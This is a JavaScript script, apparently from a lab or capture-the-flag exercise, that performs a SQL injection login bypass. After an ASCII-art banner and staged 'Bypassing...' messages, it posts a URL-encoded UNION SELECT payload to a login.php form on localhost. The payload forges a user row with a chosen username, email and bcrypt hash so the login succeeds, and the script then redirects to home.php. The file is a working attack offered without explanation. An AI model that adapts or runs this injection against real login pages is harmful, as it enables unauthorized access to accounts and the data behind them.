console.log(`
███╗   ██╗ ██████╗  ██████╗██╗  ██╗██╗███████╗██████╗ ██╗     ███████╗
████╗  ██║██╔═══██╗██╔════╝██║  ██║██║╚══███╔╝██╔══██╗██║     ╚══███╔╝
██╔██╗ ██║██║   ██║██║     ███████║██║  ███╔╝ ██████╔╝██║       ███╔╝ 
██║╚██╗██║██║   ██║██║     ██╔══██║██║ ███╔╝  ██╔═══╝ ██║      ███╔╝  
██║ ╚████║╚██████╔╝╚██████╗██║  ██║██║███████╗██║     ███████╗███████╗
╚═╝  ╚═══╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝╚═╝╚══════╝╚═╝     ╚══════╝╚══════╝
                                                                      
`);

console.log('Logging in...');

setTimeout(() => {
    console.log('Bypassing...');
    setTimeout(() => {
        console.log('Bypassed.');

        fetch('http://127.0.0.1:8080/login.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
            },
            body: 'email=\'%20UNION%20SELECT%201%20AS%20id%2c%20\'NoChizPlz\'%20AS%20username%2c%20\'nochizplz@nochizplz.com\'%20AS%20email%2c%20\'$2a$12$xkhwduBCkSl3tPhWVokC/OmrhboA0gxDWaVLl4uPLr2iSbXEtNdCq\'%20AS%20password%20%23&password=nochizplz&login=Login'
        })
            .then(response => {
                if (response.ok) {
                    console.log('Redirecting to home.php...');
                    setTimeout(() => {
                        window.location.href = 'home.php';
                    }, 2000);
                } else {
                    console.error('Login failed. Check the credentials or system status.');
                }
            })
            .catch(error => console.error('Error:', error));

    }, 2000);
}, 2000);
